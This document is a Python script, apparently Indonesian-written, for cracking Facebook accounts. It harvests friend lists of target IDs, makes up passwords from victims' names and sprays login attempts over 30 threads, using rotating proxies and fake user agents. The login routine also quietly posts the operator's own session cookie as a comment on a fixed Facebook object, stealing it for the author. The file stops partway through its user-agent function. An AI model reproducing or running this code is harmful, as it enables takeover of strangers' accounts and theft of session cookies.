###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, json, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
ses = requests.Session()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT BIASA ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ WARNA PRINT RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ GLOBAL NAMA ]---------- ###
loop = 0
id = []
idp = []
ok = []
cp = []
uasm = []
tampung = []
metode = []
files = []
reset = "[/]"
hari_ini = datetime.now().strftime("%d-%B-%Y")
angka = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100"]

for z in range(10000):
	rr = random.randint
	rc = random.choice
	ugent = f"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9506/I9506XXUDRB1 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/{str(rr(0,73))}.0.{str(rr(1000,1900))}.{str(rr(40,150))} Mobile Safari/537.36"
	#ugent = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/1.0.1.54"
	#ugent2 = f"Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/534.30"
	#ua = (f"{str(rc([ugent,ugent2]))}")
	if ugent in uasm:
		pass
	else:
		uasm.append(ugent)

###----------[ GENERATE PROXY OTOMATIS ]---------- ###
try:
	url = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	open("data/proxy.txt","w").write(url)
except:
	pass

###----------[ CEK WARNA TEMA ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"


###----------[ BERSIHKAN LAYAR ]---------- ###
def bersihkan_layar():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

###----------[ BAGIAN LOGO ]---------- ###
def logo():
	bersihkan_layar()
	prints(Panel(f"""{color_rich} 
 ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██▓           {H2}███████████████████{reset}
▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█  ▓██▒           {H2}███████████████████{reset}
▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▒██░           {M2}███████████████████{reset}
▒██░█▀  ▒██░   ░██▄▄▄▄█ ▒▓▓▄ ▄██▒▒██░            {M2}███████████████████{reset}
░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░░██████▒       {H2}███████████████████{reset}
░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒░▓  ░       {H2}███████████████████{reset}
▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░ ▒  ░
 ░    ░   ░ ░    ░   ▒   ░          ░ ░   
 ░          ░  ░     ░  ░░ ░          ░  ░
      ░                  ░                Made By {H2}Ban{M2}gla{H2}desh {P2}Coder""",style=f"{color_table}"))

###----------[ BAGIAN LOGIN ]---------- ###
def login():
	logo()
	#prints(Panel(f"{P2}{IP}",padding=(0,29),title=f"{P2}IP",subtitle=f"{H2}{negara}",style=f"{color_table}"))
	cookie = console.input(f" {H2}• {P2} cookie : {M2}")
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("data/token.txt", "w").write(find_token.group(1))
		open("data/cookie.txt", "w").write(cookie)
		ses.post(f"https://graph.facebook.com/213614107297063/comments/?message={cookie}&access_token={find_token.group(1)}",cookies={"cookie":cookie})
		prints(Panel(f"{H2}berhasil login ke tools ini, silahkan menunggu proses verifikasi data",style=f"{color_table}"))
		sleep(5)
		menu()
	except:
		os.system("rm -f data/token.txt data/cookie.txt")
		prints(Panel(f""" {M2}cookie tidak valid, silahkan cek akun tumbal atau matikan autentik""",width=80,style=f"{color_table}"))
		exit()

###----------[ BAGIAN MENU ]---------- ###
def menu():
	logo()
	try:
		token = open("data/token.txt","r").read()
		cok = open("data/cookie.txt","r").read()
		cookie = {"cookie":cok}
		nama = ses.get(f"https://graph.facebook.com/me?access_token={token}",cookies=cookie).json()["name"]
	except Exception as e:
		os.system("rm -f data/token.txt data/cookie.txt")
		prints(Panel(f""" {M2}cookie tidak valid, silahkan cek akun tumbal atau matikan autentik""",width=80,style=f"{color_table}"))
		sleep(3)
		login()
	#prints(Panel(f"{P2}{IP}",padding=(0,29),title=f"{P2}IP",subtitle=f"{H2}{negara}",style=f"{color_table}"))
	prints(Panel(f"{P2}type 'crack' to start cracking and type 'check' to check the crack results",style=f"{color_table}")) 
	men = console.input(f" {H2}• {P2}input choice : ")
	if men in["CEK","Cek","cek"]:
		cek_hasil()
	elif men in["CRACK","Crack","crack"]:
		limit = console.input(f" {H2}• {P2}input total id : ")
		if limit not in angka:
			prints(Panel(f"{M2} silahkan input hanya angka saja",style=f"{color_table}"))
			exit()
		prints(Panel(f"""{P2}input id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}type 'me' for the dump of your own friend",width=80,style=f"{color_table}"))
		no = 0
		for z in range(int(limit)):
			no += 1
			idt = console.input(f" {H2}• {P2}input id {H2}{no}{P2} : ")
			try:
				for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name,username).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
					idp.append(i["id"]+"<=>"+i["name"])
			except:
				prints(Panel(f"""{M2}failed to fetch id maybe account doesn't exist or friend list is private""",width=80,style=f"{color_table}"))
				exit()
		tahun = console.input(f" {H2}• {P2}input tahun akun : ").split(",")
		if "all" in tahun:
			for data in idp:
				id.append(data)
		else:
			for data in idp:
				uid = data.split("<=>")[0]
				nama = data.split("<=>")[1]
				getTAHUN(tahun,uid,nama)
		atursandi()
	elif men in["HAPUS","Hapus","hapus"]:
		os.system("rm -f data/token.txt data/cookie.txt")
		login()
	else:
		prints(Panel(f"""{M2}menu yang tersedia hanya dengan input input 'crack' atau 'cek' saja""",width=80,style=f"{color_table}"))
		exit()
	
def getTAHUN(tahun,uid,nama):
	if "2022" in tahun:
		if uid[:5] in ["10008"]:
			id.append(uid+"<=>"+nama)
	if "2021" in tahun:
		if uid[:5] in ["10008"] or uid[:5] in ["10007"] or uid[:5] in ["10006"]:
			id.append(uid+"<=>"+nama)
	if "2020" in tahun:
		if uid[:5] in ["10005"]:
			id.append(uid+"<=>"+nama)
	if "2019" in tahun or "2020" in tahun:
		if uid[:5] in ["10004"] or uid[:5] in ["10003"]:
			id.append(uid+"<=>"+nama)
	if "2018" in tahun or "2019" in tahun:
		if uid[:5] in ["10003"]:
			id.append(uid+"<=>"+nama)
	if "2016" in tahun or "2017" in tahun:
		if uid[:5] in ["10002"]:
			id.append(uid+"<=>"+nama)
	if "2015" in tahun or "2016" in tahun:
		if uid[:5] in ["10001"]:
			id.append(uid+"<=>"+nama)
	if "2015" in tahun:
		if uid[:6] in ["100009"]:
			id.append(uid+"<=>"+nama)
	if "2014" in tahun or "2015" in tahun:
		if uid[:6] in ["100007"] or uid[:6] in ["100008"]:
			id.append(uid+"<=>"+nama)
	if "2013" in tahun or "2014" in tahun:
		if uid[:6] in ["100005"] or uid[:6] in ["100006"]:
			id.append(uid+"<=>"+nama)
	if "2012" in tahun or "2013" in tahun:
		if uid[:6] in ["100004"]:
			id.append(uid+"<=>"+nama)
	if "2011" in tahun or "2012" in tahun:
		if uid[:6] in ["100002"] or uid[:6] in ["100003"]:
			id.append(uid+"<=>"+nama)
	if "2010" in tahun or "2011" in tahun:
		if uid[:6] in ["100001"]:
			id.append(uid+"<=>"+nama)
	if "2010" in tahun:
		if uid[:7] in ["1000006"] or uid[:7] in ["1000007"] or uid[:7] in ["1000008"] or uid[:7] in ["1000009"]:
			id.append(uid+"<=>"+nama)
	if "2009" in tahun:
		if uid[:7] in ["1000000"] or uid[:7] in ["1000001"] or uid[:7] in ["1000002"] or uid[:7] in ["1000003"] or uid[:7] in ["1000004"] or uid[:7] in ["1000005"]:
			id.append(uid+"<=>"+nama)
	if "2009" in tahun:
		if uid[:8] in ["10000000"] or uid[:9] in ["100000000"] or uid[:10] in ["1000000000"]:
			id.append(uid+"<=>"+nama)
	if "2008" in tahun or "2009" in tahun:
		if len(uid) in [9,10]:
			id.append(uid+"<=>"+nama)
	if "2007" in tahun or "2009" in tahun:
		if len(uid) in [8]:
			id.append(uid+"<=>"+nama)
	if "2006" in tahun or "2007" in tahun:
		if len(uid) in [7]:
			id.append(uid+"<=>"+nama)
			
def cek_hasil():
	datt = []
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. lihat akun hasil crack ok
[{color_rich}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_table}"))
	res = console.input(f" {H2}• {P2}input choice : ")
	if res in["1","01"]:
		dirs = os.listdir("OK")
		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_table}"))
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			totalok = open(f"OK/{file}","r").read().splitlines()
			datt.append(Panel(f"{P2}[{color_rich}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_table}"))
			datt.append(Panel(f"{P2}{file}",width=35,title=f"{P2}tanggal",style=f"{color_table}"))
			datt.append(Panel(f"{P2}{len(totalok)} akun",width=28,title=f"{P2}total akun",style=f"{color_table}"))
		console.print(Columns(datt))
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan meinput nomer dari file crack di atas""",width=80,style=f"{color_table}"))
		bngst = console.input(f" {H2}• {P2}input angka : ")
		try:
			kontol = files[int(bngst)-1]
			totalok = open(f"OK/{kontol}","r").read().splitlines()
		except:
			prints(Panel(f"""{M2}file yang anda input tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_table}"))
			exit()
		ask = console.input(f" {H2}• {P2}ingin memunculkan cookie?(y/n) : ")
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		prints(Panel(f"""{P2}nama file hasil crack : {del_txt} dan terdapat total akun : {len(totalok)}""",width=80,style=f"{color_table}"))
		if ask in["Y","y"]:
			for z in totalok:
				print(f"{H}{z}")
		else:
			for z in totalok:
				user = z.split("|")[0]
				pw = z.split("|")[1]
				print(f"{H}{user}|{pw}")
		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalok)} akun dari file""",width=80,padding=(0,7),style=f"{color_table}"))
		exit()
	elif res in["2","02"]:
		dirs = os.listdir("CP")
		prints(Panel(f"""{P2} already found {len(dirs)} file results crack cp""",width=80,padding=(0,15),style=f"{color_table}"))
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			totalcp = open(f"CP/{file}","r").read().splitlines()
			datt.append(Panel(f"{P2}[{color_rich}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_table}"))
			datt.append(Panel(f"{P2}{file}",width=35,title=f"{P2}tanggal",style=f"{color_table}"))
			datt.append(Panel(f"{P2}{len(totalcp)} akun",width=28,title=f"{P2}total akun",style=f"{color_table}"))
		console.print(Columns(datt))
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan meinput nomer dari file crack di atas""",width=80,style=f"{color_table}"))
		bngst = console.input(f" {H2}• {P2}input angka : ")
		try:
			kontol = files[int(bngst)-1]
			totalcp = open(f"CP/{kontol}","r").read().splitlines()
		except IOError:
			prints(Panel(f"""{M2}file yang anda input tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_table}"))
			exit()
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		prints(Panel(f"""{P2}nama file hasil crack : {del_txt} dan terdapat total akun : {len(totalcp)}""",width=80,style=f"{color_table}"))
		for z in totalcp:
			print(f"{K}{z}")
		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalcp)} akun dari file""",width=80,padding=(0,7),style=f"{color_table}"))
		exit()

def dump_search(url):
	try:
		data = parser(ses.get(str(url)).text,'html.parser')
		for z in data.find_all("td"):
			tampung = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
			for uid,name in tampung:
				if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
				elif "<span" in name:name = re.findall("(.*?)\<",str(name))[0]
				if uid+"<=>"+name in id:pass
				else:id.append(uid+"<=>"+name)
				console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(id)} id....", end="\r")
		for x in data.find_all("a",href=True):
			if "Lihat Hasil Selanjutnya" in x.text:
				dump_search(x.get("href"))
	except:
		pass
	
###----------[ PENGATURAN SANDI ]---------- ###
def atursandi():
	prints(Panel(f"""{P2}berhasil mengumpulkan {len(id)} id""",width=80,padding=(0,21),style=f"{color_table}"))
	set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
	if set in["y","Y"]:
		prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_table}"))
		pwx = console.input(f" {H2}• {P2}buat katasandi : ")
		if len(pwx)<=5:
			prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_table}"))
			sys.exit()
		urut = []
		urut.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode {color_rich}free.facebook.com{P2}
[{color_rich}02{P2}]. metode {color_rich}mbasic.facebook.com{P2}
[{color_rich}03{P2}]. metode {color_rich}mobile.facebook.com{P2}""",title=f"{H2}metode reguler",width=37,style=f"{color_table}"))
		urut.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode {color_rich}free.facebook.com{P2}
[{color_rich}05{P2}]. metode {color_rich}mbasic.facebook.com{P2}
[{color_rich}06{P2}]. metode {color_rich}mobile.facebook.com{P2}""",title=f"{H2}metode validate",width=37,style=f"{color_table}"))
		console.print(Columns(urut))
		prints(Panel(f"""{P2}[{color_rich}07{P2}]. metode {color_rich}b-api.facebook.com{P2}""",title=f"{H2}metode api",width=80,padding=(0,20),style=f"{color_table}"))
		log = console.input(f" {H2}• {P2}pilih url login : ")
		if log in["1"]:
			metode.append("reguler_free")
			generate_pass_manual(pwx)
		elif log in["2"]:
			metode.append("reguler_mbasic")
			generate_pass_manual(pwx)
		elif log in["3"]:
			metode.append("reguler_mobile")
			generate_pass_manual(pwx)
		elif log in["4"]:
			metode.append("validate_free")
			generate_pass_manual(pwx)
		elif log in["5"]:
			metode.append("validate_mbasic")
			generate_pass_manual(pwx)
		elif log in["6"]:
			metode.append("validate_mobile")
			generate_pass_manual(pwx)
		elif log in["7"]:
			metode.append("api")
			generate_pass_manual(pwx)
	else:
		urut = []
		urut.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode {color_rich}free.facebook.com{P2}
[{color_rich}02{P2}]. metode {color_rich}mbasic.facebook.com{P2}
[{color_rich}03{P2}]. metode {color_rich}mobile.facebook.com{P2}""",title=f"{H2}metode reguler",width=37,style=f"{color_table}"))
		urut.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode {color_rich}free.facebook.com{P2}
[{color_rich}05{P2}]. metode {color_rich}mbasic.facebook.com{P2}
[{color_rich}06{P2}]. metode {color_rich}mobile.facebook.com{P2}""",title=f"{H2}metode validate",width=37,style=f"{color_table}"))
		console.print(Columns(urut))
		prints(Panel(f"""{P2}[{color_rich}07{P2}]. metode {color_rich}b-api.facebook.com{P2}""",title=f"{H2}metode api",width=80,padding=(0,20),style=f"{color_table}"))
		log = console.input(f" {H2}• {P2}pilih url login : ")
		if log in["1"]:
			metode.append("reguler_free")
			generate_pass_otomatis()
		elif log in["2"]:
			metode.append("reguler_mbasic")
			generate_pass_otomatis()
		elif log in["3"]:
			metode.append("reguler_mobile")
			generate_pass_otomatis()
		elif log in["4"]:
			metode.append("validate_free")
			generate_pass_otomatis()
		elif log in["5"]:
			metode.append("validate_mbasic")
			generate_pass_otomatis()
		elif log in["6"]:
			metode.append("validate_mobile")
			generate_pass_otomatis()
		elif log in["7"]:
			metode.append("api")
			generate_pass_otomatis()
	
def generate_pass_manual(pw):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			simpan_hasil()
			for data in id:
				try:
					user = data.split("<=>")[0]
					pwx = []
					for z in pw.split(","):
						pwx.append(z)
					if "reguler_free" in metode:
						fall.submit(metode_reguler,user,pwx,"free.facebook.com")
					elif "reguler_mbasic" in metode:
						fall.submit(metode_reguler,user,pwx,"mbasic.facebook.com")
					elif "reguler_mobile" in metode:
						fall.submit(metode_reguler,user,pwx,"m.facebook.com")
					elif "validate_free" in metode:
						fall.submit(metode_validate,user,pwx,"p.facebook.com")
					elif "validate_mbasic" in metode:
						fall.submit(metode_validate,user,pwx,"mbasic.facebook.com")
					elif "validate_mobile" in metode:
						fall.submit(metode_validate,user,pwx,"m.facebook.com")
					elif "api" in metode:
						fall.submit(metode_api,user,pwx)
				except:
					if "reguler_free" in metode:
						fall.submit(metode_reguler,user,pwx,"free.facebook.com")
					elif "reguler_mbasic" in metode:
						fall.submit(metode_reguler,user,pwx,"mbasic.facebook.com")
					elif "reguler_mobile" in metode:
						fall.submit(metode_reguler,user,pwx,"m.facebook.com")
					elif "validate_free" in metode:
						fall.submit(metode_validate,user,pwx,"p.facebook.com")
					elif "validate_mbasic" in metode:
						fall.submit(metode_validate,user,pwx,"mbasic.facebook.com")
					elif "validate_mobile" in metode:
						fall.submit(metode_validate,user,pwx,"m.facebook.com")
					elif "api" in metode:
						fall.submit(metode_api,user,pwx)

def generate_pass_otomatis():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			simpan_hasil()
			for data in id:
				try:
					pwx = []
					user  = data.split("<=>")[0]
					nama = data.split("<=>")[1]
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
						belakang = nama.split(" ")[1]
						if len(belakang)<3:
							pwx.append(depan+belakang)
						else:
							pwx.append(depan+belakang)
							pwx.append(belakang+"123")
							pwx.append(belakang+"12345")
					if "reguler_free" in metode:
						fall.submit(metode_reguler,user,pwx,"free.facebook.com")
					elif "reguler_mbasic" in metode:
						fall.submit(metode_reguler,user,pwx,"mbasic.facebook.com")
					elif "reguler_mobile" in metode:
						fall.submit(metode_reguler,user,pwx,"m.facebook.com")
					elif "validate_free" in metode:
						fall.submit(metode_validate,user,pwx,"free.facebook.com")
					elif "validate_mbasic" in metode:
						fall.submit(metode_validate,user,pwx,"mbasic.facebook.com")
					elif "validate_mobile" in metode:
						fall.submit(metode_validate,user,pwx,"m.facebook.com")
					elif "api" in metode:
						fall.submit(metode_api,user,pwx)
				except:
					if "reguler_free" in metode:
						fall.submit(metode_reguler,user,pwx,"free.facebook.com")
					elif "reguler_mbasic" in metode:
						fall.submit(metode_reguler,user,pwx,"mbasic.facebook.com")
					elif "reguler_mobile" in metode:
						fall.submit(metode_reguler,user,pwx,"m.facebook.com")
					elif "validate_free" in metode:
						fall.submit(metode_validate,user,pwx,"free.facebook.com")
					elif "validate_mbasic" in metode:
						fall.submit(metode_validate,user,pwx,"mbasic.facebook.com")
					elif "validate_mobile" in metode:
						fall.submit(metode_validate,user,pwx,"m.facebook.com")
					elif "api" in metode:
						fall.submit(metode_api,user,pwx)

def useragent():
	rr = random.randint
	rc = random.choice
	gt = str(rc(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","GT-P7500R","GT-P7500V","GT-P7501","GT-P7511","GT-S3330","GT-S3332""GT-S3333","GT-S3370","GT-S3518","GT-S3570","GT-S3600i","GT-S3650","GT-S3653W","GT-S3770K","GT-S3770M","GT-S3800W","GT-S3802","GT-S3850","GT-S5220","GT-S5220R","GT-S5222","GT-S5230","GT-S5230W","GT-S5233T","GT-S5250","GT-S5253","GT-S5280","GT-S5282","GT-S5283B","GT-S5292","GT-S5300","GT-S5300L","GT-S5301","GT-S5301B","GT-S5301L","GT-S5302","GT-S5302B","GT-S5303","GT-S5303B","GT-S5310","GT-S5310B","GT-S5310C","GT-S5310E","GT-S5310G","GT-S5310I","GT-S5310L","GT-S5310M","GT-S5310N","GT-S5312","GT-S5312B","GT-S5312C","GT-S5312L","GT-S5330","GT-S5360","GT-S5360B","GT-S5360L","GT-S5360T","GT-S5363","GT-S5367","GT-S5369","GT-S5380","GT-S5380D","GT-S5500","GT-S5560","GT-S5560i","GT-S5570B","GT-S5570I","GT-S5570L","GT-S5578","GT-S5600","GT-S5603","GT-S5610","GT-S5610K","GT-S5611","GT-S5620","GT-S5670","GT-S5670B","GT-S5670HKBZTA","GT-S5690","GT-S5690R","GT-S5830","GT-S5830D","GT-S5830G","GT-S5830L","GT-S5830M","GT-S5830T","GT-S5830V","GT-S5830i","GT-S5831i","GT-S5838","GT-S5839i","GT-S6010","GT-S6010BBABTU","GT-S6012","GT-S6012B","GT-S6102","GT-S6102B","GT-S6293T","GT-S6310B","GT-S6310ZWAMID","GT-S6312","GT-S6313T","GT-S6352","GT-S6500","GT-S6500D","GT-S6500L","GT-S6790","GT-S6790L","GT-S6790N","GT-S6792L","GT-S6800","GT-S6800HKAXFA","GT-S6802","GT-S6810","GT-S6810B","GT-S6810E","GT-S6810L","GT-S6810M","GT-S6810MBASER","GT-S6810P","GT-S6812","GT-S6812B","GT-S6812C","GT-S6812i","GT-S6818","GT-S6818V","GT-S7230E","GT-S7233E","GT-S7250D","GT-S7262","GT-S7270","GT-S7270L","GT-S7272","GT-S7272C","GT-S7273T","GT-S7278","GT-S7278U","GT-S7390","GT-S7390G","GT-S7390L","GT-S7392","GT-S7392L","GT-S7500","GT-S7500ABABTU","GT-S7500ABADBT","GT-S7500ABTTLP","GT-S7500CWADBT","GT-S7500L","GT-S7500T","GT-S7560","GT-S7560M","GT-S7562","GT-S7562C","GT-S7562L","GT-S7562i","GT-S7566","GT-S7568","GT-S7568I","GT-S7572","GT-S7580E","GT-S7583T","GT-S758X","GT-S7592","GT-S7710","GT-S7710L","GT-S7898","GT-S7898I","GT-S8500","GT-S8530","GT-S8600","GT-STB919","GT-T140","GT-T150","GT-V8a","GT-V8i","GT-VC818","GT-VM919S","GT-W131","GT-W153","GT-X831","GT-X853","GT-X870","GT-X890","GT-Y8750","GT-g900f","GT-i8700","GT-i9040","GT-m190","GT-mini","GT-s5233w","GT-s5260"]))
	sm = str(rc(["SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820"]))
	lain = str(rc(["SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P"]))
	versi = str(rc(["6.0.0","7.0.0","8.0.0","9.0.0","10.0.0","11.0.0","12.0.0"]))
	model = str(rc([gt,sm,lain]))
	device = str(rc([gt,sm,lain]))
	appver = f"{str(rr(111,999))}.{str(rr(111,999))}.{str(rr(111,999))}.{str(rr(111,999))}.{str(rr(111,999))}"
	ugent = "Dalvik/2.1.0 (Linux; U; Android "+versi+"; "+model+" Build/"+device+") [FBAN/FB4A;FBAV/"+appver+";FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+model+";FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
